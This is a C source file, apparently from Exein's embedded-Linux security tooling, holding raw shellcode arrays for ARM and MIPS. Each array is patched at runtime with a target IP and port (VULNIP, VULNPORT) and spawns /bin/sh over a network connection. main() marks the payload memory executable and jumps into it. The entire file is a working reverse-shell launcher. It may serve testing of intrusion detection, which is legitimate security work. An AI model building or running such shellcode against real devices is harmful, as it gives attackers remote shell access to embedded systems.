/* Copyright 2019 Exein. All Rights Reserved.

Licensed under the GNU General Public License, Version 3.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    https://www.gnu.org/licenses/gpl-3.0.html

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
==============================================================================*/

#include <stdint.h>
#include <stdio.h>
#include <sys/mman.h>


#ifdef __ARMEL__
int payload[]=  {
		 0xe28f1001, 0xe12fff11, 0x21012002, 0x020f1a92, 0xdf013719, 0xa1081c06, 0x37022210, 0x273fdf01, 0x1c302102, 0x3901df01, 0xa005d5fb, 0xb4051a92, 0x270b4669, 0x46c0df01,
		 (((VULNPORT>>8) | ((VULNPORT<<8) & 0xffff))<<16) +2,		// port
		 0x0201a8c0,			// ip
		 0x6e69622f, 0x0068732f
		};


uint32_t parseIPV4string(char* ipAddress) {
	unsigned int ipbytes[4];

	int x= sscanf(ipAddress, "%d.%d.%d.%d", &ipbytes[3], &ipbytes[2], &ipbytes[1], &ipbytes[0]);
	return ipbytes[3] | ipbytes[2] << 8 | ipbytes[1] << 16 | ipbytes[0] << 24;
}
#endif

#ifdef __MIPSEB
int payload[]=  {
		 0x240ffffd, 0x01e02027, 0x01e02827, 0x2806ffff, 0x24021057, 0x0101010c, 0xafa2ffff, 0x8fa4ffff, 0x240ffffd, 0x01e07827, 0xafafffe0,
		 0x3c0e0000 + VULNPORT,	// port
		 0x35ce7a69, 0xafaeffe4,
		 0x3c0d0a0a,		// [IP ]
		 0x35ad0169,		// [IP ]
		 0xafadffe6, 0x23a5ffe2, 0x240cffef, 0x01803027, 0x2402104a, 0x0101010c, 0x240ffffd, 0x01e02827, 0x8fa4ffff, 0x24020fdf, 0x0101010c, 0x20a5ffff, 0x2401ffff, 0x14a1fffb, 0x3c082f2f, 0x35086269, 0xafa8ffec, 0x3c086e2f, 0x35087368, 0xafa8fff0, 0x3407ffff, 0x00e0382a, 0xafa7fff4, 0xafa7fffc, 0x23a4ffec, 0x23a8ffec, 0xafa8fff8, 0x23a5fff8, 0x27bdffec, 0x3406ffff, 0x00c0302a, 0x24020fab, 0x0109090c 
		};

uint32_t parseIPV4string(char* ipAddress) {
	unsigned int ipbytes[4];

	int x= sscanf(ipAddress, "%d.%d.%d.%d", &ipbytes[3], &ipbytes[2], &ipbytes[1], &ipbytes[0]);
	return ipbytes[0] | ipbytes[1] << 8 | ipbytes[2] << 16 | ipbytes[3] << 24;
}
#endif

#ifdef __MIPSEL
int payload[]=  {
		 0x2804ffff, 0x24020fa6, 0x0109090c, 0x28041111, 0x24020fa6, 0x0109090c, 0x240cfffd, 0x01802027, 0x24020fa6, 0x0109090c, 0x240cfffd, 0x01802027, 0x01802827, 0x2806ffff, 0x24021057, 0x0109090c, 0x3044ffff, 0x24020fc9, 0x0109090c, 0x24020fc9, 0x0109090c, 
		 0x3c050000 +  (VULNPORT>>8) | ((VULNPORT<<8) & 0xffff),		// #21 port
		 0x34a50002,0xafa5fff8,
		 0x3c05FFFF,			// #25 IP High
		 0x34a5FFFF,			// #26 IP Low
		 0xafa5fffc, 0x23a5fff8, 0x240cffef, 0x01803027, 0x2402104a, 0x0109090c, 0x3c086962, 0x35082f2f, 0xafa8ffec, 0x3c086873, 0x35082f6e, 0xafa8fff0, 0x2807ffff, 0xafa7fff4, 0xafa7fffc, 0x23a4ffec, 0x23a8ffec, 0xafa8fff8, 0x23a5fff8, 0x27bdffec, 0x2806ffff, 0x24020fab, 0x0109090c
		};

uint32_t parseIPV4string(char* ipAddress) {
	unsigned int ipbytes[4];

	int x= sscanf(ipAddress, "%d.%d.%d.%d", &ipbytes[3], &ipbytes[2], &ipbytes[1], &ipbytes[0]);
	return ipbytes[3] | ipbytes[2] << 8 | ipbytes[1] << 16 | ipbytes[0] << 24;
}
#endif

int change_page_perm_at_address(void *addr) {
    int page_size = getpagesize();
    addr -= (unsigned long)addr % page_size;
    if(mprotect(addr, page_size, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
        return -1;
    }
    return 0;
}

int main(){
#ifdef __ARMEL__
change_page_perm_at_address(&payload);
payload[15] = parseIPV4string(&VULNIP);
#endif
#ifdef __MIPSEB
uint32_t ip =parseIPV4string(&VULNIP);
payload[14] =(ip >> 16) + 0x3c0d0000;
payload[15] =(ip & 0xffff) + 0x35ad0000;
#endif

#ifdef __MIPSEL
uint32_t ip =parseIPV4string(&VULNIP);
payload[24] =(ip >> 16)    + 0x3c050000;
payload[25] =(ip & 0xffff) + 0x34a50000;
#endif

  printf("\n");

  void (*pippo)(void);
  pippo = (void (*)(void)) &payload;
  (*pippo)();
}
